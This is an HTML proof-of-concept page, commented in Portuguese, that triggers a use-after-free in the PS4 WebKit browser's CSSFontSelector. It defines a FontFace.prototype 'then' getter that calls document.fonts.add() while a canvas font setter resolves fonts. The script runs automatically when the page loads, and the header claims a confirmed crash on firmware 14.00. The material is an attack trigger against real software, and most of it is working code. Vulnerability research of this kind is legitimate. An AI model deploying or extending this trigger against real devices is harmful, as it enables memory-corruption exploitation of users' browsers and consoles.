<!DOCTYPE html>
<!--
  UAF: CSSFontSelector via ctx.font setter + document.fonts.add()
  ================================================================
  Bug class  : Use-After-Free (CWE-416)
  Target     : PS4 libSceNKWebKit.sprx / AppleWebKit 605.1.15
  Trigger    : ctx.font = 'size FontName'  (nao ctx.measureText!)
  Victim C++ : CSSFontSelector — iterador/cache invalido por mutacao
               de FontFaceSet durante font selection code

  MECANISMO:
  ----------
  1. ctx.font = '10px T' chama CanvasRenderingContext2DBase::setFont()
  2. setFont() chama CSSFontSelector::fontForFamily('T')
  3. Durante resolucao, ES2015 thenable check: [[Get]] FontFace.prototype.then
  4. Getter dispara com CSSFontSelector code na call stack
  5. document.fonts.add() muta o FontFaceSet enquanto CSSFontSelector
     o itera ou indexa — invalida ponteiro/iterador
  6. CSSFontSelector continua com ponteiro dangling → UAF → CRASH

  CONFIRMADO: PS4 FW 14.00 — crash detectado via localStorage
  Derivado de: secao A ("document.fonts.add(new FontFace)") e
               secao C V1 ("fonts.add() 1 face") do diagnostico v4
-->
<html>
<body>
<script>
function trigger() {
    var face = new FontFace('T', 'local(Helvetica)');
    document.fonts.add(face);
    void face.loaded;

    var fired = false;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get: function() {
            if (fired) return undefined;
            fired = true;
            document.fonts.add(new FontFace('U', 'local(Helvetica)'));
            return undefined;
        }
    });

    var c = document.createElement('canvas');
    c.getContext('2d').font = '10px T';
}

window.onload = function() { setTimeout(trigger, 0); };
</script>
</body>
</html>
